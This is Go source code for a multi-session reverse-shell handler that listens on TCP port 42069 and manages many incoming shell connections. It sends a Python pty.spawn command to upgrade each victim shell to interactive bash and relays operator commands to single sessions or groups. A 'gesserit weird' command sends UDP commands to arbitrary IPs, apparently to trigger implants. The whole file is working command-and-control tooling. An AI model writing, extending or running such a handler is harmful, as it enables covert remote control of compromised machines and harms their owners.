package main

import (
	"fmt"
	"net"
	"os"
	"bufio"
	"strings"
	"strconv"
)

const (
	HOST = "0.0.0.0"
	PORT = "42069"
	TYPE = "tcp"
)

type session struct {
	connection net.Conn
	sid int
}

var hushed bool

func receiveData(conn net.Conn) string {
	msg := make([]byte, 2048)
	_, err := conn.Read(msg[0:])
	if err != nil {
		fmt.Println("Error receiving data", err.Error())
		return "THISCONNECTIONISDEAD"
	}
	return string(msg)
}

func sendData(conn net.Conn, data string) {
	_, err := conn.Write([]byte(data))
	if err != nil {
		fmt.Println("Error sending data", err.Error())
	}
}

func groupSendData(groupSessionList []session, data string) {
	for i:= 0; i < len(groupSessionList); i++ {
		sendData(groupSessionList[i].connection, data);
	}
}

func handleConnection(s session) {
	if hushed == false {
		fmt.Println("attempting to spawn tty session...")
		tty_spawn := "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
		sendData(s.connection, tty_spawn)
		fmt.Println("------------------------------------------")
	}
	for {
		dat := receiveData(s.connection)
		if dat == "THISCONNECTIONISDEAD" {
			return
		}
		_, err := fmt.Print(dat)
		if err != nil {
			fmt.Println("Connection", s.connection, "closed")
			return
		}
	}
}

func listen(l net.Listener, sessions *[]session){
	fmt.Println("Listening")
	i := 0
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error trying to accept", err.Error())
			os.Exit(1)
		}
		s := session{conn, i}
		*sessions = append(*sessions, s)
		if hushed == false {
			fmt.Println("New Session from " + conn.RemoteAddr().String())
		}
		i++
		go handleConnection(s)
		defer conn.Close()
	}
}

func list_sessions(sessions []session, currentSession int){
	for i:= 0; i < len(sessions); i++ {
		if i == currentSession {
			fmt.Println("*", sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
		}else{
			fmt.Println(sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
		}
	}
}

func print_group(sessions []session){
	for i:= 0; i < len(sessions); i++ {
		fmt.Println(sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
	}
}

func send_udp(ip string, command string){
    src_port := 42069  
    target_port := 42069
    targetAddr, err := net.ResolveUDPAddr("udp", ip+":"+strconv.Itoa(target_port))
    if err != nil {
		fmt.Println("Failed to resolve target address:", err)
	}
    sourceAddr, err := net.ResolveUDPAddr("udp", ":"+strconv.Itoa(src_port))
	if err != nil {
		fmt.Println("Failed to resolve source address:", err)
	}
    conn, err := net.DialUDP("udp", sourceAddr, targetAddr)
	if err != nil {
		fmt.Println("Failed to create UDP connection:", err)
	}
	defer conn.Close()

    _, err = conn.Write([]byte(command))
	if err != nil {
		fmt.Println("Failed to send UDP packet:", err)
	} else {
		fmt.Printf("UDP packet sent from port %s to %s:%s with data: %s\n", src_port, ip, target_port, command)
	}
}

func main() {

	currentSession := 0
	sessions := make([]session, 0)
	groupSessionList := make([]session, 0)

	l, err := net.Listen(TYPE, HOST + ":" + PORT)
	if err != nil {
		fmt.Println("Error trying to listen", err.Error())
		os.Exit(1)
	}

	defer l.Close()

	go listen(l, &sessions)

	for {
		reader := bufio.NewReader(os.Stdin)
		cmd, _ := reader.ReadString('\n')
		if strings.Contains(cmd, "gesserit switch") {
			st := strings.Fields(cmd)
			newS, err := strconv.Atoi(st[2])
			if err != nil {
				fmt.Println("Session does not exist")
			}
			currentSession = newS
		} else if cmd == "gesserit list\n"{
			list_sessions(sessions, currentSession)
		} else if cmd == "gesserit grouplist\n" {
			print_group(groupSessionList)
		} else if strings.Contains(cmd, "gesserit weird"){
            st := strings.Fields(cmd)
            if len(st) >= 3 {
                ip := st[2]
                command_to_send := strings.Join(st[3:], " ")
                send_udp(ip, command_to_send)  
            }
        } else if strings.Contains(cmd, "gesserit add"){
			st := strings.Fields(cmd)
			s, err := strconv.Atoi(st[2])
			if err != nil {
				fmt.Println("Session does not exist")
			}
			groupSessionList = append(groupSessionList, sessions[s])
		} else if strings.Contains(cmd, "gesserit remove"){
			st := strings.Fields(cmd)
			s, err := strconv.Atoi(st[2])
			if err != nil {
				fmt.Println("Session does not exist")
			}
			for i:= 0; i < len(groupSessionList); i++ {
				if groupSessionList[i].sid == s{
					groupSessionList[i] = groupSessionList[len(groupSessionList) - 1]
					groupSessionList = groupSessionList[:len(groupSessionList) - 1]
				}
			}
		} else if strings.Contains(cmd, "gesserit groupsend"){
			newCmd := cmd[18:]
			groupSendData(groupSessionList, newCmd)
		} else if strings.Contains(cmd, "gesserit hush"){
			hushed = true
		} else if strings.Contains(cmd, "gesserit yell"){
			hushed = false
		} else if cmd == "gesserit quit\n" {
			os.Exit(3)
		} else {
			sendData(sessions[currentSession].connection, cmd)
		}
	}
}
